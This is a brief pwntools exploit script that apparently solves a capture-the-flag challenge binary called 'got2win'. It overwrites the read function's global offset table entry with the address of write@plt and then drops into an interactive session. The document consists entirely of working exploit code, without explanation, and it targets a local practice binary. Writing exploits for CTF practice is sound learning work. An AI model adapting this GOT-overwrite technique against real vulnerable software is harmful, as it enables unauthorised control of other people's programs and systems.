from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

read_got = 0x404038
write_plt = 0x4010c0

r = process('./got2win')

r.sendlineafter(b': ', str(read_got).encode())
r.sendafter(b': ', p64(write_plt))

r.interactive()